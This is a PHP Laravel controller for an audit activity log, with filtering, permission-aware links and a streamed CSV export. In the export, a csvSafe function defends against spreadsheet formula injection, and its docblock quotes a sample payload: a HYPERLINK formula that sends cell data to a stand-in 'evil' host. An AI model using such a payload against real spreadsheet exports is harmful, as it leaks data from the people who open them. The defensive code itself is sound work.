<?php

declare(strict_types=1);

namespace App\Modules\Audit\Http\Controllers;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Modules\Audit\Action;
use App\Modules\Audit\ActivityLog;
use App\Modules\Audit\ActivityLogScope;
use App\Modules\Audit\ActivityOrigin;
use App\Modules\Files\Models\File;
use App\Modules\Files\Models\Folder;
use App\Modules\Groups\Models\Group;
use App\Modules\Identity\Models\Role;
use App\Modules\Identity\UserType;
use App\Modules\Platform\Capabilities\Capability;
use App\Modules\Platform\Capabilities\CapabilityRegistry;
use App\Modules\Platform\Localization\LocalDay;
use App\Modules\Platform\Localization\TimezoneRegistry;
use Carbon\Carbon;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Http\Request;
use Illuminate\Support\Collection;
use Illuminate\Validation\Rule;
use Inertia\Inertia;
use Inertia\Response;
use Symfony\Component\HttpFoundation\StreamedResponse;

class ActivityLogController extends Controller
{
    public function __construct(
        private readonly CapabilityRegistry $capabilities,
        private readonly ActivityLogScope $scope,
        private readonly TimezoneRegistry $timezones,
    ) {}

    public function index(Request $request): Response
    {
        $filters = $this->validatedFilters($request);

        $viewer = $request->user();
        assert($viewer !== null);

        $entries = $this->filteredQuery($filters, $viewer)
            ->paginate(25)
            ->withQueryString();

        $links = $this->linkResolver($entries->getCollection(), $viewer);

        return Inertia::render('activity/index', [
            'entries' => $entries->getCollection()->map(fn (ActivityLog $entry): array => [
                'id' => $entry->id,
                'created_at' => $entry->created_at->toIso8601String(),
                'actor_name' => $entry->actor_name,
                'actor_type' => $entry->actor_type,
                'origin' => $entry->origin->value,
                'origin_label' => $entry->origin->label(),
                'api_token_name' => $entry->api_token_name,
                'action' => $entry->action->value,
                'template' => $entry->action->template(),
                'replacements' => $this->replacements($entry),
                'actor_url' => $links($entry->actor_id, User::class),
                'subject_url' => $links($entry->subject_id, $entry->subject_type),
            ])->all(),
            'pagination' => [
                'page' => $entries->currentPage(),
                'last_page' => $entries->lastPage(),
                'prev' => $entries->previousPageUrl(),
                'next' => $entries->nextPageUrl(),
                'total' => $entries->total(),
            ],
            'filters' => $filters,
            'actions' => array_map(fn (Action $action): array => [
                'key' => $action->value,
                'description' => $action->description(),
            ], Action::cases()),
            // Every origin this installation could actually produce.
            // Offering a filter that can only ever return nothing would
            // be dangling a feature this edition does not have, which is
            // the one thing the edition boundary is meant not to do.
            'origins' => collect(ActivityOrigin::cases())
                ->reject(fn (ActivityOrigin $origin): bool => $origin === ActivityOrigin::Mcp
                    && ! $this->capabilities->has(Capability::AiConnector))
                ->map(fn (ActivityOrigin $origin): array => [
                    'key' => $origin->value,
                    'label' => $origin->label(),
                ])
                ->values()
                ->all(),
        ]);
    }

    /**
     * Streamed CSV export honoring the same filters as the list.
     */
    public function export(Request $request): StreamedResponse
    {
        $filters = $this->validatedFilters($request);

        $viewer = $request->user();
        assert($viewer !== null);

        // Both the filename and every row are stamped in the exporter's
        // own zone, so a file named for "today" holds the rows the screen
        // showed under that same word.
        $timezone = $this->timezones->resolve($viewer);

        $filename = 'activity-log-'.now()->setTimezone($timezone)->format('Y-m-d').'.csv';

        return response()->streamDownload(function () use ($filters, $viewer, $timezone): void {
            $out = fopen('php://output', 'w');
            assert($out !== false);

            fputcsv($out, ['Date', 'Account', 'Account type', 'Origin', 'API token', 'Action', 'Description', 'Subject', 'Details']);

            foreach ($this->filteredQuery($filters, $viewer)->lazy() as $entry) {
                fputcsv($out, array_map($this->csvSafe(...), [
                    // Kept as ISO 8601 — a spreadsheet parses it and the
                    // offset makes the zone self-describing, so the column
                    // stays unambiguous once it leaves the app.
                    $entry->created_at->setTimezone($timezone)->toIso8601String(),
                    $entry->actor_name ?? 'System',
                    $entry->actor_type ?? 'system',
                    $entry->origin->label(),
                    $entry->api_token_name ?? '',
                    $entry->action->value,
                    __($entry->action->template(), $this->replacements($entry)),
                    $entry->subject_name,
                    $entry->context === null ? '' : json_encode($entry->context),
                ]));
            }

            fclose($out);
        }, $filename, ['Content-Type' => 'text/csv']);
    }

    /**
     * Neutralize spreadsheet formula injection. Half the columns here carry
     * names the subject chose themselves — a self-registering client picks
     * their own, and it lands in `actor_name` — so a value like
     * `=HYPERLINK("http://evil/?"&A1,"x")` would execute when an admin opens
     * the export. Excel/Sheets/LibreOffice all treat a leading =, +, -, @,
     * tab or CR as the start of a formula; prefixing with an apostrophe
     * makes the cell literal text while still displaying the value.
     */
    private function csvSafe(mixed $value): string
    {
        $value = is_scalar($value) ? (string) $value : '';

        return preg_match('/^[=+\-@\t\r]/', $value) === 1 ? "'".$value : $value;
    }

    /**
     * Builds a resolver mapping (id, morph class) to the edit URL of a
     * still-existing object — only when the viewer is allowed to open
     * it. Lookups are batched for the current page.
     *
     * @param  Collection<int, ActivityLog>  $entries
     * @return callable(int|null, string|null): ?string
     */
    private function linkResolver(Collection $entries, User $viewer): callable
    {
        $userIds = $entries->pluck('actor_id')
            ->merge($entries->where('subject_type', User::class)->pluck('subject_id'))
            ->filter()
            ->unique();

        $roleIds = $entries->where('subject_type', Role::class)->pluck('subject_id')->filter()->unique();
        $groupIds = $entries->where('subject_type', Group::class)->pluck('subject_id')->filter()->unique();
        $fileIds = $entries->where('subject_type', File::class)->pluck('subject_id')->filter()->unique();
        $folderIds = $entries->where('subject_type', Folder::class)->pluck('subject_id')->filter()->unique();

        /** @var array<int, UserType> $users */
        $users = $userIds->isEmpty()
            ? []
            : User::query()->whereIn('id', $userIds)->pluck('type', 'id')->all();

        /** @var array<int, true> $roles */
        $roles = $roleIds->isEmpty()
            ? []
            : Role::query()->whereIn('id', $roleIds)->pluck('id')->mapWithKeys(fn ($id) => [(int) $id => true])->all();

        /** @var array<int, true> $groups */
        $groups = $groupIds->isEmpty()
            ? []
            : Group::query()->whereIn('id', $groupIds)->pluck('id')->mapWithKeys(fn ($id) => [(int) $id => true])->all();

        // Resolved through the viewer's library scope, not a bare existence
        // check: permission alone said "this viewer may open files", which
        // for a client-scoped viewer produced links to files they would get
        // a 403 on.
        $files = $this->scope->openableFileIds($viewer, $fileIds);
        $folders = $this->scope->openableFolderIds($viewer, $folderIds);

        $staffModule = $this->capabilities->has(Capability::UsersManage) && $viewer->can('manage_users');
        $canStaff = $staffModule && $viewer->can('edit_users');
        $canClients = $viewer->can('edit_clients');
        $canGroups = $viewer->can('edit_groups');
        $canFiles = $viewer->can('upload') || $viewer->can('edit_files') || $viewer->can('edit_others_files');

        return function (?int $id, ?string $morphClass) use ($users, $roles, $groups, $files, $folders, $canStaff, $canClients, $canGroups, $canFiles, $staffModule): ?string {
            if ($id === null) {
                return null;
            }

            if ($morphClass === User::class && isset($users[$id])) {
                return match (true) {
                    $users[$id] === UserType::Staff && $canStaff => route('users.edit', $id, false),
                    $users[$id] === UserType::Client && $canClients => route('clients.edit', $id, false),
                    default => null,
                };
            }

            if ($morphClass === Role::class && isset($roles[$id]) && $staffModule) {
                return route('roles.edit', $id, false);
            }

            if ($morphClass === Group::class && isset($groups[$id]) && $canGroups) {
                return route('groups.edit', $id, false);
            }

            if ($morphClass === File::class && isset($files[$id]) && $canFiles) {
                return route('files.edit', $id, false);
            }

            if ($morphClass === Folder::class && isset($folders[$id]) && $canFiles) {
                return route('files.index', ['folder' => $id], false);
            }

            return null;
        };
    }

    /**
     * Placeholder values for the entry's sentence template: the subject
     * name plus any scalar context values.
     *
     * @return array<string, string>
     */
    private function replacements(ActivityLog $entry): array
    {
        $replacements = [
            'subject' => $entry->subject_name
                ?? ($entry->subject_id !== null ? __('(deleted account)') : ''),
        ];

        foreach ($entry->context ?? [] as $key => $value) {
            if (is_scalar($value)) {
                $replacements[$key] = (string) $value;
            }
        }

        return $replacements;
    }

    /**
     * @return array{action: ?string, actor_type: ?string, origin: ?string, api_token: ?string, actor: ?string, from: ?string, to: ?string}
     */
    private function validatedFilters(Request $request): array
    {
        $validated = $request->validate([
            'action' => ['nullable', Rule::enum(Action::class)],
            'actor_type' => ['nullable', Rule::in(['staff', 'client', 'system'])],
            'origin' => ['nullable', Rule::enum(ActivityOrigin::class)],
            'api_token' => ['nullable', 'string', 'max:255'],
            'actor' => ['nullable', 'string', 'max:255'],
            'from' => ['nullable', 'date'],
            'to' => ['nullable', 'date', 'after_or_equal:from'],
        ]);

        return [
            'action' => $validated['action'] ?? null,
            'actor_type' => $validated['actor_type'] ?? null,
            'origin' => $validated['origin'] ?? null,
            'api_token' => $validated['api_token'] ?? null,
            'actor' => $validated['actor'] ?? null,
            'from' => $validated['from'] ?? null,
            'to' => $validated['to'] ?? null,
        ];
    }

    /**
     * @param  array{action: ?string, actor_type: ?string, origin: ?string, api_token: ?string, actor: ?string, from: ?string, to: ?string}  $filters
     * @return Builder<ActivityLog>
     */
    private function filteredQuery(array $filters, User $viewer): Builder
    {
        $timezone = $this->timezones->resolve($viewer);

        return $this->scope->apply(ActivityLog::query(), $viewer)
            ->when($filters['action'], fn (Builder $query, string $action) => $query->where('action', $action))
            ->when($filters['origin'], fn (Builder $query, string $origin) => $query->where('origin', $origin))
            // Matched on the snapshotted name rather than the id, so a
            // revoked token's history stays reachable — which is exactly
            // when someone follows this link.
            ->when($filters['api_token'], fn (Builder $query, string $token) => $query->where('api_token_name', $token))
            ->when($filters['actor_type'], fn (Builder $query, string $type) => $type === 'system'
                ? $query->whereNull('actor_type')
                : $query->where('actor_type', $type))
            ->when($filters['actor'], fn (Builder $query, string $actor) => $query->where('actor_name', 'like', "%{$actor}%"))
            // Bounded by the viewer's own day rather than the UTC one —
            // see LocalDay for why whereDate() cannot do this.
            ->when(
                $filters['from'] !== null ? LocalDay::start($filters['from'], $timezone) : null,
                fn (Builder $query, Carbon $from) => $query->where('created_at', '>=', $from),
            )
            ->when(
                $filters['to'] !== null ? LocalDay::end($filters['to'], $timezone) : null,
                fn (Builder $query, Carbon $to) => $query->where('created_at', '<=', $to),
            )
            ->orderByDesc('created_at')
            ->orderByDesc('id');
    }
}
